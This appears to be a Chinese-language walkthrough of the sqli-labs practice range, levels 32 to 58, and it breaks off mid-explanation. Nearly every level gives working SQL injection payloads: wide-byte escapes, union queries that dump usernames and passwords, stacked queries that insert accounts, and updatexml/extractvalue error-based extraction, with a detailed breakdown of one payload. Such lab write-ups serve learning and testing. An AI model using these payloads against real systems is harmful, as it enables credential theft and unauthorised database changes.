+![Less-32-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-32-03.png)
+
+> 其中，0x7365637572697479是users的十六进制编码
+
+
+
+~~~ cmd
+?id=-1%df%27%20union%20select%201,database(),group_concat(username,password)%20from%20users--+
+~~~
+
+![Less-32-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-32-04.png)
+
+
+
+注释：url注释字符编码对照表
+
+![Less-32-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-32-05.png)
+
+![Less-32-06](.\img\Less-32-06.png)
+
+
+
+### Less-33
+
+第三十二关和三十三关一模一样
+
+~~~ cmd
+?id=-1%df%27%20union%20select%201,2,3--+
+~~~
+
+![Less-33-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-33-01.png)
+
+
+
+~~~ cmd
+?id=-1%df%27%20union%20select%201,database(),version()--+
+~~~
+
+![Less-33-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-33-02.png)
+
+
+
+~~~ cmd
+?id=-1%df%27%20union%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()--+
+~~~
+
+![Less-33-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-33-03.png)
+
+
+
+~~~ cmd
+?id=-1%df%27%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7573657273--+
+~~~
+
+![Less-33-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-33-04.png)
+
+
+
+~~~ cmd
+?id=-1%df%27%20union%20select%201,database(),group_concat(username,password)%20from%20users--+
+~~~
+
+![Less-33-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-33-05.png)
+
+
+
+### Less-34
+
+这关是POST请求，post型相比于get型少了url编码，这里采用一种新方法，可使用三个字节的汉字将反斜杠消耗
+
+
+
+~~~ cmd
+passwd=admin&submit=Submit&uname=admin汉#
+~~~
+
+![Less-34-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-34-01.png)
+
+
+
+~~~ cmd
+passwd=admin&submit=Submit&uname=admin汉'#
+~~~
+
+![Less-34-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-34-02.png)
+
+
+
+~~~ cmd
+passwd=admin&submit=Submit&uname=admin汉' order by 2#
+~~~
+
+![Less-34-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-34-03.png)
+
+
+
+~~~ cmd
+passwd=admin&submit=Submit&uname=admin汉' order by 3#
+~~~
+
+![Less-34-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-34-04.png)
+
+
+
+~~~ cmd
+passwd=admin&submit=Submit&uname=admin汉' union select 1,2#
+~~~
+
+![Less-34-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-34-05.png)
+
+
+
+~~~ cmd
+passwd=admin&submit=Submit&uname=admin汉' union select version(),database()#
+~~~
+
+![Less-34-06](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-34-06.png)
+
+
+
+~~~ cmd
+passwd=admin&submit=Submit&uname=admin汉' union select version(),group_concat(table_name) from information_schema.tables where table_schema = database()#
+~~~
+
+![Less-34-07](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-34-07.png)
+
+
+
+
+
+~~~ cmd
+passwd=admin&submit=Submit&uname=admin汉' union select version(),group_concat(column_name) from information_schema.columns where table_name = 0x7573657273#
+~~~
+
+![Less-34-08](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-34-08.png)
+
+
+
+~~~ cmd
+passwd=admin&submit=Submit&uname=admin汉' union select version(),group_concat(username,password) from users#
+~~~
+
+![Less-34-09](.\img\Less-34-09.png)
+
+
+
+### Less-35
+
+使用`addslashes`函数对于输入的内容进行转义，但是id参数没有引号，主要影响在于后续爆字段时候需要用的表名加了引号，只需将表名换成十六进制编码就行，直接使用联合查询就可以了
+
+
+
+首先
+
+~~~ cmd
+?id=-1%20union%20select%201,2,3--+
+~~~
+
+![Less-35-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-35-04.png)
+
+
+
+~~~ cmd
+?id=-1%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--+
+~~~
+
+![Less-35-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-35-01.png)
+
+
+
+~~~ cmd
+?id=-1%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=0x7573657273--+
+~~~
+
+![Less-35-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-35-02.png)
+
+
+
+~~~ cmd
+?id=-1%20union%20select%201,group_concat(username,password),3%20from%20users--+
+~~~
+
+![Less-35-03](.\img\Less-35-03.png)
+
+
+
+### Less-36
+
+查看后端代码发现使用了mysql_real_escape_string函数对输入的字符进行过滤：
+
+~~~ php
+    $string= mysql_real_escape_string($string);    
+~~~
+
+可以尝试宽字节注入
+
+
+
+~~~ cmd
+?id=-1%df%27%20union%20select%201,2,3--+
+~~~
+
+![Less-36-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-36-01.png)
+
+
+
+~~~ cmd
+?id=-1%df%27%20union%20select%201,database(),version()--+
+~~~
+
+![Less-36-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-36-02.png)
+
+
+
+~~~ cmd
+?id=-1%df%27%20union%20select%201,database(),group_concat(table_name) from information_schema.tables where table_schema = database()--+
+~~~
+
+![Less-36-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-36-03.png)
+
+
+
+~~~ cmd
+?id=-1%df%27%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name%20=0x7573657273--+
+~~~
+
+![Less-36-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-36-04.png)
+
+
+
+~~~ cmd
+?id=-1%df%27%20union%20select%201,database(),group_concat(username,password)%20from%20users--+
+~~~
+
+![Less-36-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-36-05.png)
+
+
+
+### Less-37
+
+三十七关是post提交，使用mysql_real_escape_string函数对于账户和密码都进行转义，使用宽字节注入就行。可使用三个字节的汉字将反斜杠消耗
+
+
+
+~~~ cmd
+passwd=admin&submit=Submit&uname=1汉' order by 2--+
+~~~
+
+![Less-37-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-37-03.png)
+
+
+
+
+
+~~~ cmd
+passwd=admin&submit=Submit&uname=1汉' order by 3--+
+~~~
+
+![Less-37-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-37-02.png)
+
+
+
+~~~ cmd
+passwd=admin&submit=Submit&uname=1汉' union select 1,2--+
+~~~
+
+![Less-37-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-37-04.png)
+
+
+
+~~~ cmd
+passwd=admin&submit=Submit&uname=1汉' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+
+~~~
+
+![Less-37-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-37-05.png)
+
+
+
+~~~ cmd
+passwd=admin&submit=Submit&uname=1汉' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+
+~~~
+
+![Less-37-06](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-37-06.png)
+
+
+
+~~~ cmd
+passwd=admin&submit=Submit&uname=1汉' union select 1,group_concat(username,password) from users--+
+~~~
+
+![Less-37-07](.\img\Less-37-07.png)
+
+
+
+### Less-38
+
+这一关其实就是单引号闭合，使用正常单引号闭合就可以进行注入，不过这里可以有另外一种注入就是堆叠注入，因为存在`mysqli_multi_query`函数，该函数支持多条`sql`语句同时进行
+
+~~~ cmd
+?id=1%27;insert%20into%20users(id,username,password)%20values%20(%2738%27,%27less38%27,%27hello%27)--+
+#向数据表插入自己的账户密码
+~~~
+
+![Less-38-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-38-01.png)
+
+ 
+
+~~~ cmd
+?id=38
+~~~
+
+![Less-38-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-38-02.png)
+
+
+
+
+
+~~~ cmd
+?id=-1%27%20union%20select%201,2,3--+
+~~~
+
+![Less-38-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-38-03.png)
+
+
+
+~~~ cmd
+?id=-1%27%20union%20select%201,version(),database()--+
+~~~
+
+![Less-38-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-38-04.png)
+
+
+
+~~~ cmd
+?id=-1%27%20union%20select%201,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
+~~~
+
+![Less-38-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-38-05.png)
+
+
+
+~~~ cmd
+?id=-1%27%20union%20select%201,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+
+~~~
+
+![Less-38-06](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-38-06.png)
+
+
+
+~~~ cmd
+?id=-1%27%20union%20select%201,2,group_concat(username,password) from users--+
+~~~
+
+![Less-38-07](.\img\Less-38-07.png)
+
+
+
+### Less-39
+
+`id`参数是整数，正常联合注入就行
+
+
+
+~~~ cmd
+?id=-1%20union%20select%201,2,3
+~~~
+
+![Less-39-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-39-01.png)
+
+
+
+~~~ cmd
+?id=-1%20union%20select%201,version(),database()
+~~~
+
+![Less-39-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-39-02.png)
+
+
+
+~~~ cmd
+?id=-1%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()
+~~~
+
+![Less-39-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-39-03.png)
+
+
+
+~~~ cmd
+?id=-1%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name='users'
+~~~
+
+![Less-39-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-39-04.png)
+
+
+
+~~~ cmd
+?id=-1%20union%20select%201,2,group_concat(username,password)%20from%20users
+~~~
+
+![Less-39-05](.\img\Less-39-05.png)
+
+
+
+### Less-40
+
+四十关id参数是单引号加括号闭合，然后使用联合注入就可以了
+
+
+
+~~~ cmd
+?id=-1%27)%20union%20select%201,2,3--+
+~~~
+
+![Less-40-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-40-01.png)
+
+
+
+~~~~ cmd
+?id=-1%27)%20union%20select%201,database(),version()--+
+~~~~
+
+![Less-40-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-40-02.png)
+
+
+
+~~~ cmd
+?id=-1%27)%20union%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()--+
+~~~
+
+![Less-40-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-40-03.png)
+
+
+
+~~~ cmd
+?id=-1%27)%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name="users"--+
+~~~
+
+![Less-40-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-40-04.png)
+
+
+
+~~~ cmd
+?id=-1%27)%20union%20select%201,database(),group_concat(username,password)%20from%20users--+
+~~~
+
+![Less-40-05](.\img\Less-40-05.png)
+
+
+
+### Less-41
+
+~~~ cmd
+?id=-1%20union%20select%201,2,3
+~~~
+
+![Less-41-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-41-01.png)
+
+
+
+~~~ cmd
+?id=-1%20union%20select%201,version(),database()
+~~~
+
+![Less-41-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-41-02.png)
+
+
+
+~~~ cmd
+?id=-1%20union%20select%201,version(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()
+~~~
+
+![Less-41-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-41-03.png)
+
+
+
+~~~ cmd
+?id=-1%20union%20select%201,version(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name="users"
+~~~
+
+![Less-41-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-41-04.png)
+
+
+
+~~~ cmd
+?id=-1%20union%20select%201,version(),group_concat(username,password)%20from%20users
+~~~
+
+![Less-41-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-41-05.png)
+
+
+
+### Less-42
+
+因为账户进行了转义处理但密码没有做处理且数据库没有使用`gbk`编码所以不能使用宽字节注入，但是存在堆叠注入函数，所以我们可以在密码那里使用堆叠注入从而向数据库插入密码账号，这样我们再来使用其进行登录就很简单了。
+
+![Less42_02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less42_02.PNG)
+
+~~~ cmd
+login_user=1&login_password=1';insert into users(id,username,password) values ('39','Less42','111111')--+&mysubmit=Login
+~~~
+
+
+
+后面使用已经插入的账号密码进行登录即可
+
+![Less42_03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less42_03.PNG)
+
+![Less42_04](.\img\Less42_04.PNG)
+
+
+
+### Less-43
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/85b4c20914c2cbca85bf4d622c609388.png)
+
+四十三关和四十二关差不多但是密码参数是单引号和括号闭合的。
+
+![Less43-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-43-01.PNG)
+
+![Less43-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-43-02.PNG)
+
+~~~ cmd
+login_user=1&login_password=1');insert into users(id,username,password) values ('41','Less43','111111')--+&mysubmit=Login
+~~~
+
+
+
+后面使用已经插入的账号密码进行登录即可
+
+![Less43-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-43-03.PNG)
+
+![Less-43-04](.\img\Less-43-04.PNG)
+
+
+
+### Less-44
+
+四十四关和四十二关一样，所以直接向数据库插入数据
+
+![Less-44-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-44-01.png)
+
+![Less-44-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-44-02.png)
+
+~~~ cmd
+login_user=1&login_password=1';insert into users(id,username,password) values ('42','Less44','111111')--+&mysubmit=Login
+~~~
+
+
+
+后面使用已经插入的账号密码进行登录即可
+
+![Less-44-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-44-03.png)
+
+![Less-44-04](.\img\Less-44-04.png)
+
+
+
+### Less-45
+
+四十五关和四十三关一样，密码参数是单引号和括号闭合的。
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/dd1541bfde20f5a155ff97941c1722b1.png)
+
+
+
+![Less-45-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-45-01.png)
+
+
+
+![Less-45-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-45-02.png)
+
+~~~ cmd
+login_user=1&login_password=1');insert into users(id,username,password) values ('43','Less45','111111')--+&mysubmit=Login
+~~~
+
+
+
+使用插入的账号密码登录
+
+![Less-45-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-45-03.png)
+
+![Less-45-04](.\img\Less-45-04.png)
+
+
+
+### Less-46
+
+使用新的参数`sort`，通过输入`1，2，3`表中出现不同数据，该sql语句是`order by`，`sql`语句参数没有引号且不能使用联合注入，有报错显示，所以我们可以使用`updatexml`进行报错
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/abf8317de2bdc102c0c914da1c75787a.png)
+
+~~~ cmd
+?sort=1 and (updatexml(1,concat(0x5c,(select group_concat(password,'-',username) from users),0x5c),1))
+#其中0x5c指的是ASCII码中的\
+~~~
+
+![](./img/Less-46-01.PNG)
+
+
+
+### Less-47
+
+使用新的参数`sort`，通过输入`1，2，3`表中出现不同数据，该sql语句是`order by`，`sql`语句参数没有引号且不能使用联合注入，有报错显示，所以我们可以使用`updatexml`进行报错。而且多了一个单引号闭合，所以可以使用报错注入
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/57d0471ff1e06ca723219b3f863098ef.png)
+
+
+
+~~~ cmd
+?sort=1‘ and (updatexml(1,concat(0x5c,(select group_concat(password,'-',username) from users),0x5c),1))
+#其中0x5c指的是ASCII码中的\
+~~~
+
+![](./img/Less-47-01.PNG)
+
+
+
+### Less-48
+
+使用新的参数`sort`，通过输入`1，2，3`表中出现不同数据，该sql语句是`order by`，`sql`语句参数没有引号且不能使用联合注入，并且没有报错显示，所以使用延时注入。
+
+![](./img/b13887d2b0955f92f3140663acbecce9.png)
+
+
+
+
+
+### Less-49
+
+四十九关和四十七关一样，不过没有报错显示，所以使用延时注入。
+
+![](./img/a51aa0d68040cbe39d920de44f344e1b.png)
+
+
+
+### Less-50
+
+五十关和四十六关一样，可以使用updatexml进行报错注入，不过这个里面还可以使用堆叠注入，因为使用了mysqli_multi_query函数，支持多条sql语句执行。也可以延时注入。可以借鉴三十八代码
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/861f275ca1eed50e34dece79ef6af964.png)
+
+
+
+### Less-51
+
+该参数单引号闭合，可以报错注入，可以延时注入，可以堆叠注入
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/a79817b6f469078b522c10005ee934c2.png)
+
+
+
+
+
+~~~ cmd
+?sort=1%27;insert%20into%20users(id,username,password)%20values%20(%2750%27,%27less38%27,%27hello%27)--+
+~~~
+
+![](.\img\Less-50-01.PNG)
+
+
+
+### Less-52
+
+该参数是整数型，且没有报错显示，只能堆叠注入或者延时注入
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/77b3398c5f7c504b364f7ac4ba9332f3.png)
+
+
+
+可用堆叠注入
+
+~~~ cmd
+?sort=1;insert%20into%20users(id,username,password)%20values%20(%2752%27,%27less38%27,%27hello%27)--+
+~~~
+
+![](./img/Less-52-01.PNG)
+
+
+
+### Less-53
+
+该参数是字符型，单引号闭合，没有报错显示，可以使用堆叠注入和延时注入。
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/8ec2e8d4426094740bc66f73b2d3d252.png)
+
+
+
+~~~ cmd
+sort=-1%27;insert%20into%20users(id,username,password)%20values%20(%2753%27,%27less38%27,%27hello%27)--+
+~~~
+
+![](.\img\Less-53-01.PNG)
+
+
+
+### Less-54
+
+五十四关翻译页面的英文，得知只有十次输入机会，超过十次所有表名，列名，等等都会随机重置。id参数是单引号闭合就行。
+
+![Less-54-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/8af33a53059d1ae86882ac4125639932.png)
+
+
+
+~~~ cmd
+?id=1
+~~~
+
+![Less-54-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-54-02.PNG)
+
+
+
+~~~ cmd
+？id=1'
+~~~
+
+![Less-54-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-54-01.PNG)
+
+两者不同，由此可判断该处存在`sql`注入点
+
+
+
+~~~ cmd
+?id=-1 union select 1,2,3--+
+~~~
+
+可以联合注入，由此就是正常流程了
+
+![Less-54-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-54-03.PNG)
+
+
+
+~~~ cmd
+?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
+~~~
+
+![Less-54-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-54-04.PNG)
+
+其中，这次的`table_name`是`D1LTYW5BW8`，对于每次运行网站该名都会改变
+
+
+
+~~~ cmd
+?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='D1LTYW5BW8' and table_schema=database()--+
+~~~
+
+![Less-54-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-54-05.PNG)
+
+
+
+~~~ cmd
+?id=-1' union select 1,group_concat(secret_6K0N),3 from D1LTYW5BW8--+
+~~~
+
+由此获得正确的key值
+
+![Less-54-06](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-54-06.PNG)
+
+
+
+将获取的key值放到下面输入框点击提交，就完成所有步骤。
+
+
+
+### Less-55
+
+五十五关是有14次机会，id参数是加了括号的整数，还是正常流程，先闭合再拖库
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/a516af628f76da9d8d35643c816d811a.png)
+
+![Less-55-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-55-01.PNG)
+
+
+
+~~~ cmd
+?id=1
+~~~
+
+![Less-55-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-55-02.PNG)
+
+
+
+
+
+~~~ cmd
+?id=1)
+~~~
+
+![Less-55-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-55-03.PNG)
+
+
+
+两者不一致，说明这里存在`sql`注入点
+
+
+
+~~~ cmd
+?id=1) union select 1,2,3--+
+~~~
+
+![Less-55-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-55-04.PNG)
+
+
+
+~~~ cmd
+?id=-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database()--+
+~~~
+
+![Less-55-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-55-05.PNG)
+
+
+
+~~~ cmd
+?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name="2F1CH3L20D"--+
+~~~
+
+![Less-55-06](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-55-06.PNG)
+
+
+
+~~~ cmd
+?id=-1) union select 1,group_concat(secret_A8VM),3 from 2F1CH3L20D--+
+~~~
+
+![Less-55-07](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-55-07.PNG)
+
+
+
+由此成功爆破出`secret_key`
+
+
+
+### Less-56
+
+五十六关需要单引号和括号
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/0689c9f477087e64b099a5b195b3fba4.png)
+
+
+
+~~~ cmd 
+?id=-1 union select 1,2,3--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-56-01.PNG)
+
+
+
+~~~ cmd
+?id=-1’) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-56-02.PNG)
+
+
+
+~~~ cmd
+?id=-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name="SXKFOWFC9B"--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-56-03.PNG)
+
+
+
+~~~ cmd
+?id=-1') union select 1,group_concat(secret_7W08),3 from SXKFOWFC9B--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-56-04.PNG)
+
+
+
+由此成功
+
+
+
+### Less-57
+
+代码审计可看出，这关是双引号闭合
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/b46c30b5992229e745a726e1c208a54a.png)
+
+
+
+~~~ cmd
+?id=1
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-57-01.PNG)
+
+
+
+~~~ cmd
+？id=1"
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-57-02.PNG)
+
+
+
+~~~ cmd
+?id=-1" union select 1,2,3--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-57-03.PNG)
+
+
+
+~~~ cmd
+?id=-1" union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-57-04.PNG)
+
+
+
+~~~ cmd
+?id=-1" union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name="7RKM0LN0LB"--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-57-05.PNG)
+
+
+
+~~~ cmd
+?id=-1" union select 1,group_concat(secret_PZ2C),3 from 7RKM0LN0LB--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-57-06.PNG)
+
+由此成功
+
+
+
+### Less-58
+
+该关卡的数据不是直接数据库里面取得，而是在一个数组里面取出得。所以联合注入是不行得。但是有报错显示，所以可以使用报错注入。
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/ab1845ed4030ba4e454c2630c4fa6428.png)
+
+
+
+
+
+**【分析源码】**：
+
+可以看见，这里的逻辑是先查询，根据查询返回用户名结果去储存用户名的数组里面找密码（密码就是用户名数组的逆序）。所以这里联合注入无效了，联合注入注入出东西用户名数组里面没有，就没有返回值。
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/e7ca443cf1d979b6afce27955c21226b.png)
+
+继续往下看，发现开启了报错，所以我们可以用报错注入
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/fc4d13aa7e49c9719f9c447605cb8c4a.png)
+
+源码中查询语句基于`select`，这里报错注入的语句也得基于`select`。
+
+
+
+#### 爆库
+
+```sql
+?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1)--+
+```
+
+1. **`?id=1'`**  
+   - URL 查询参数，尝试将 `id` 的值设置为 `1'`。  
+   - 目的：闭合后端 SQL 语句中原本的字符串单引号，使后续注入的代码能够被解析执行。
+
+2. **`and`**  
+   - SQL 逻辑运算符，用于连接原始条件与注入的报错注入语句。  
+   - 作用：使整个查询条件成立时（通常为 `and 1=1` 效果），触发 `updatexml` 函数。
+
+3. **`updatexml(1, concat(0x7e, (子查询), 0x7e), 1)`**  
+   - MySQL 的 `updatexml()` 函数，本用于修改 XML 文档，但此处利用其报错特性进行信息提取。  
+   - 参数1（`1`）：XML 文档片段（无实际意义，仅作占位）。  
+   - 参数2（`concat(..., ..., ...)`）：构造一个无效的 XPath 表达式，强制报错并显示拼接后的字符串。  
+   - 参数3（`1`）：新值（无实际意义）。  
+   - 由于 XPath 表达式包含 `~`（ASCII 0x7e）和子查询结果，表达式非法，MySQL 会报错并输出表达式内容，从而泄露数据。
+
+4. **`concat(0x7e, (子查询), 0x7e)`**  
+   - `0x7e` 是波浪号 `~` 的十六进制表示，用作报错信息中的分隔符，便于观察提取的数据。  
+   - 中间嵌套的子查询用于从数据库元数据表中获取表名。
+
+5. **`(select group_concat(table_name) from information_schema.tables where table_schema='challenges')`**  
+   - 子查询：从 `information_schema.tables`（MySQL 系统表，存储所有表元数据）中查询 `table_schema`（数据库名）为 `'challenges'` 的所有表名。  
+   - `group_concat(table_name)` 将多个表名用逗号连接成一个字符串。  
+   - 最终结果会被拼接到 XPath 表达式中，并通过报错信息输出。
+
+6. **`--+`**  
+   - `--` 是 SQL 单行注释符号，用于注释掉原始 SQL 语句中 `id=1'` 之后的所有剩余代码（如原有的 `'` 或其他条件）。  
+   - `+` 在 URL 中被解码为空格，确保注释符与后续内容正确分隔。
+
+
+
+或者
+
+```sql
+?id=-1' AND EXTRACTVALUE(1,(CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()),0x7e))) --%20--+
+```
+
+1. **`?id=-1'`**  
+   - URL 查询参数，将 `id` 赋值为 `-1'`。  
+   - `-1` 使原始查询条件返回 false（假设无 `id=-1` 的记录），目的是不干扰报错信息的输出；  
+   - 结尾的单引号 `'` 用于闭合后端 SQL 语句中原本的字符串定界符，使后续注入的代码成为有效 SQL 语法。
+
+2. **`AND`**  
+   - SQL 逻辑运算符，将原始查询条件（`id=-1'`）与后面的报错注入语句连接。  
+   - 由于 `id=-1'` 为假，整个 `AND` 表达式结果为假，但 MySQL 仍会执行 `EXTRACTVALUE` 函数，从而触发报错并泄露信息。
+
+3. **`EXTRACTVALUE(1, (CONCAT(0x7e, (子查询), 0x7e)))`**  
